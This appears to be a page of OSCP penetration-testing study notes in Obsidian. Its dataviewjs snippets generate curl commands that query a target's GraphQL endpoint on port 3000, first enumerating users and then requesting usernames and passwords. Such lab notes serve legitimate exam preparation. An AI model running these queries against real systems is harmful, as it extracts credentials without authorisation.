```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";

const command = `curl -s -G http://${ip}:3000/graphql --data-urlencode "query={user}" | jq`;

dv.paragraph("```bash\n" + command + "\n```");
```
Query endpoint
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";

const command = `curl -s -G http://${ip}:3000/graphql --data-urlencode 'query={user {username} }' | jq`;

dv.paragraph("```bash\n" + command + "\n```");
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";

const command = `curl -s -G http://${ip}:3000/graphql --data-urlencode 'query={user {username, password} }' | jq`;

dv.paragraph("```bash\n" + command + "\n```");
```

